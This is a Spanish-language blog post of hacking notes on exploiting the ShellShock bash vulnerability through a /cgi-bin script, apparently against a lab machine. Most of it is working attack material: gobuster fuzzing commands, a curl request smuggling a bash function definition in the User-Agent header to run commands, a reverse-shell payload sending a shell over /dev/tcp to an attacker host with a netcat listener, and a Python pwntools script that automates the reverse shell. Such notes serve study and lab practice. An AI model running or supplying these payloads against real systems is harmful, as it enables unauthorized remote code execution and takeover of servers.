---
layout: single
title: Ataque ShellShock - Hacking Notes
excerpt: "Apuntes de la vulnerabilidad ShellShock (Spanish)"
date: 2025-03-16
classes: wide
header:
  teaser: /img2/obsidian.jpg
  teaser_home_page: true
  icon: /img2/images/Dashboard.jpeg
categories:
  - Hacking Notes
  - Web
tags:
  - Shellshock
---


# Índice 
--------
1. [[#Identificar vulnerabilidad]]
2. [[#Explotación de ShellShock]]

-------------

## Identificar vulnerabilidad

- Para que ocurra el ataque ShellShock la bash del sistema tiene que estar desactualizada.

- Normalmente, si encuentras un directorio /cgi-bin/, puede ser factible testear un ShellShock
![](/img/Pasted%20image%2020241217170001.png)


- Fuzzing sobre el directorio /cgi-bin
```bash
gobuster dir -u http://192.168.1.177/cgi-bin --proxy http://192.168.1.177:3128 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi
```
![](/img/Pasted%20image%2020241217171034.png)


- Vemos que en el directorio status se está ejecutando el comando uptime
```
curl -s http://192.168.1.177/cgi-bin/status --proxy http://192.168.1.177:3128 | jq
```
![](/img/Pasted%20image%2020241217171256.png)

Vemos que se actualiza el comando cada vez que hacemos la petición 

## Explotación de ShellShock

- Probamos si ejecuta comandos
```bash
curl -s http://192.168.1.177/cgi-bin/status --proxy http://192.168.1.177:3128 -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```
![](/img/Pasted%20image%2020241217171921.png)

A veces es necesario poner uno o mas echo; para ver el comando

- Nos mandamos una reverse shell
```bash
curl -s http://192.168.1.177/cgi-bin/status --proxy http://192.168.1.177:3128 -H "User-Agent: () { :; };  /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.170/443 0>&1'"
```
```bash
nc -nlvp 443
```
![](/img/Pasted%20image%2020241217172552.png)


--------
## Crear script en python para la reverse shell (OPCIONAL)

```python
#!/usr/bin/env python3 

import sys,signal,requests, threading
from pwn import *

def def_handler(sig,frame):
  print("\n\n[!] Saliendo...\n")

signal.signal(signal.SIGINT,def_handler)

main_url = "http://192.168.1.177/cgi-bin/status"
proxy= {'http': 'http://192.168.1.177:3128'}
lport = 443

def shellshock():
  headers= {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.170/443 0>&1'"}

  r = requests.get(main_url, headers=headers, proxies=proxy)

if __name__=='__main__':

  try:
    threading.Thread(target=shellshock, args=()).start()
  except Exception as e:
    log.error(str(e))

  shell= listen(lport, timeout=20).wait_for_connection()

  if shell.sock is None:
    log.failure("No se puedo establecer conexión")
    sys.exit(1)
  else:
    shell.interactive()
```